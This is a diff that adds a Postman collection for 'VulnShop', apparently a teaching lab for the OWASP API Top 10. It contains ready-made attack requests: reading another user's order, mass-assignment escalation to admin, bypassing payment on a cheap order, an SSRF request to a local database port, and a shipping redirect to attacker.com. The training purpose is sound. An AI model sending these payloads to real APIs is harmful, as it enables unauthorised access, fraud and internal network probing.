@@ -1,0 +1,122 @@
+{
+  "info": {
+    "name": "VulnShop - OWASP API Top 10 Lab",
+    "description": "Postman collection for students: login, exploit and analyze each of the 10 vulnerabilities.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "01 - Login as Alice (User)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": { "mode": "raw", "raw": "{\n  \"email\": \"alice.jones@example.com\",\n  \"password\": \"AlicePass1!\"\n}" },
+        "url": { "raw": "{{base_url}}/api/auth/login", "host": [ "{{base_url}}" ], "path": [ "api", "auth", "login" ] }
+      },
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "exec": [
+              "var res = pm.response.json();",
+              "if (res.access_token) { pm.environment.set('token', res.access_token); }",
+              "if (res.user && res.user.id) { pm.environment.set('userId', res.user.id); }",
+              "pm.test('Login ok', function(){ pm.expect(pm.response.code).to.eql(200); });"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "name": "02 - BOLA: Read another user's order",
+      "request": {
+        "method": "GET",
+        "header": [ { "key": "Authorization", "value": "Bearer {{token}}" } ],
+        "url": { "raw": "{{base_url}}/api/orders/2", "host": [ "{{base_url}}" ], "path": [ "api", "orders", "2" ] }
+      }
+    },
+    {
+      "name": "03 - Broken Auth: Access products without token",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": { "raw": "{{base_url}}/api/products", "host": [ "{{base_url}}" ], "path": [ "api", "products" ] }
+      }
+    },
+    {
+      "name": "04 - Mass Assignment: Become admin",
+      "request": {
+        "method": "PATCH",
+        "header": [ { "key": "Authorization", "value": "Bearer {{token}}" }, { "key": "Content-Type", "value": "application/json" } ],
+        "body": { "mode": "raw", "raw": "{\n  \"is_admin\": true,\n  \"role\": \"admin\"\n}" },
+        "url": { "raw": "{{base_url}}/api/users/{{userId}}", "host": [ "{{base_url}}" ], "path": [ "api", "users", "{{userId}}" ] }
+      }
+    },
+    {
+      "name": "05 - Resource Exhaustion: Large limit",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": { "raw": "{{base_url}}/api/products?limit=999999999", "host": [ "{{base_url}}" ], "path": [ "api", "products" ], "query": [ { "key": "limit", "value": "999999999" } ] }
+      }
+    },
+    {
+      "name": "06 - Function Auth Bypass: Access admin endpoints",
+      "request": {
+        "method": "GET",
+        "header": [ { "key": "Authorization", "value": "Bearer {{token}}" } ],
+        "url": { "raw": "{{base_url}}/api/admin/users", "host": [ "{{base_url}}" ], "path": [ "api", "admin", "users" ] }
+      }
+    },
+    {
+      "name": "07 - Business Logic: Create low-price order and confirm",
+      "item": [
+        {
+          "name": "07a - Create cheap order",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Authorization", "value": "Bearer {{token}}" }, { "key": "Content-Type", "value": "application/json" } ],
+            "body": { "mode": "raw", "raw": "{\n  \"product_id\": 3,\n  \"quantity\": 1,\n  \"price\": 1\n}" },
+            "url": { "raw": "{{base_url}}/api/orders", "host": [ "{{base_url}}" ], "path": [ "api", "orders" ] }
+          },
+          "event": [ { "listen": "test", "script": { "exec": [ "var res = pm.response.json(); if (res.order && res.order.id) { pm.environment.set('last_order_id', res.order.id); }" ] } } ]
+        },
+        {
+          "name": "07b - Confirm created order (skip payment)",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Authorization", "value": "Bearer {{token}}" } ],
+            "url": { "raw": "{{base_url}}/api/orders/{{last_order_id}}/confirm", "host": [ "{{base_url}}" ], "path": [ "api", "orders", "{{last_order_id}}", "confirm" ] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "08 - SSRF: Fetch internal URL",
+      "request": {
+        "method": "POST",
+        "header": [ { "key": "Authorization", "value": "Bearer {{token}}" }, { "key": "Content-Type", "value": "application/json" } ],
+        "body": { "mode": "raw", "raw": "{\n  \"url\": \"http://127.0.0.1:5432\"\n}" },
+        "url": { "raw": "{{base_url}}/api/utils/fetch-url", "host": [ "{{base_url}}" ], "path": [ "api", "utils", "fetch-url" ] }
+      }
+    },
+    {
+      "name": "09 - Misconfiguration: Debug endpoint",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": { "raw": "{{base_url}}/api/v1/debug/users", "host": [ "{{base_url}}" ], "path": [ "api", "v1", "debug", "users" ] }
+      }
+    },
+    {
+      "name": "10 - Unsafe Third-Party API: Shipping quote redirect",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": { "raw": "{{base_url}}/api/shipping/quote?destination=http://attacker.com", "host": [ "{{base_url}}" ], "path": [ "api", "shipping", "quote" ], "query": [ { "key": "destination", "value": "http://attacker.com" } ] }
+      }
+    }
+  ]
+}
